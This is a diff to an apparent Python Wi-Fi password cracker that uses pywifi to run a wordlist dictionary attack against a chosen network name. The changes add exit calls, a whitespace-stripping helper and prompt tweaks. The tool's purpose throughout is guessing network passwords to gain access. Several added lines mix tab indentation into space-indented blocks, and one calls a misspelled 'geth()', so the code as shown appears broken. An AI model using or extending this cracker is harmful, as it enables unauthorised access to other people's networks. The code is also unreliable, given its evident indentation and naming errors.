@@ -7,6 +7,9 @@ import os
 
 profile = pywifi.Profile()
 
+def remove_098(string):
+    return string.replace(" ", "")
+
 def crack(password):
 
     while True:
@@ -45,6 +48,7 @@ def crack(password):
 
                     print(Fore.RED + "(!ERROR!) " + Fore.WHITE + "=" + Fore.GREEN + " (!Wifi name was not found!)\n" + Fore.WHITE)
                     getch()
+		    exit(0)
 
                 time.sleep(4)
                 if iface.status() == const.IFACE_CONNECTED:
@@ -54,6 +58,7 @@ def crack(password):
             else:
                          print("\nConnection was " + Fore.GREEN + "successful!" + Fore.WHITE)
                          getch()
+		         exit(0)
 
 def read_password():
                  "" "Прочитать пароль" ""
@@ -75,7 +80,8 @@ def read_password():
                                 boolte = crack(password)
                                 if boolte == True:
                                     print (Fore.GREEN + "Right password!: " + Fore.WHITE + password + "\n") # Если взлом прошел успешно, выходим из программы
-                                    
+                                    geth()
+				    exit(0)
 
                                 else:
                                        print (Fore.RED + "bad pas: " + Fore.WHITE + password)
@@ -91,13 +97,14 @@ def read_password():
 
                     print(Fore.RED + "\n(!ERROR!) " + Fore.WHITE + "=" + Fore.GREEN + " (!Txt file or ssid was not found!)\n" + Fore.WHITE)
                     getch()
+		    exit(0)
 
 def wifi_hack_start():
 
     os.system("cls")
-    print(Fore.RED + "Write 'esc' (for exit)")
+    print(Fore.RED + "Enter 'esc' (for exit)")
     ferd = input(Fore.YELLOW + "Enter wifi name: " + Fore.WHITE)
-    if ferd.lower() == "esc":
+    if remove_098(ferd.lower()) == "esc":
         exit(0)
     try:
         
@@ -107,9 +114,11 @@ def wifi_hack_start():
 
         print(Fore.RED + "\n(!ERROR!) " + Fore.WHITE + "=" + Fore.GREEN + " (!Wifi name or txt file was not found!)\n" + Fore.WHITE)
         getch()
+	exit(0)
 
+    print(Fore.RED + "\nEnter 'esc' (for exit)")
     ferdtxt = input(Fore.YELLOW + "Enter path to txt file: " + Fore.WHITE)
-    if ferdtxt.lower() == "esc":
+    if remove_098(ferdtxt.lower()) == "esc":
         exit(0)
     try:
         
@@ -120,6 +129,7 @@ def wifi_hack_start():
 
         print(Fore.RED + "\n(!ERROR!) " + Fore.WHITE + "=" + Fore.GREEN + " (!Txt file or ssid was not found!)\n" + Fore.WHITE)
         getch()
+	exit(0)
 
     read_password()
 
